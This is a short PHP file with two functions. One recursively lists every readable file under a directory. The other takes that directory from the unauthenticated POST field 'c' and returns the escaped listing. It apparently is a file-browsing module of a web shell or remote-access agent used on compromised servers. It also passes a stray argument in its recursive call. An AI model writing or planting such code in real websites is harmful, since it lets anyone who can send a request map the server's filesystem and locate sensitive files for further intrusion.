<?php
function getFileList($dir) {
    echo "$dir/".PHP_EOL;
    if(substr($dir, -1) != "/") $dir .= "/";

    $d = @dir($dir);
    while($d && false !== ($entry = $d->read())) {
      if ($entry == "." || $entry == "..") continue;
      if(is_dir("$dir$entry")) {
        getFileList("$dir$entry", $files);
      }elseif(is_readable("$dir$entry")) {
        echo "$dir$entry".PHP_EOL;
      }
    }
    if ($d) $d->close();
}

function macrorecursive_listing() {
    ob_start();
    getFileList($_POST['c']);
    $output = ob_get_clean();
    return addcslashes($output,"\n\r\t\\'\0");
}
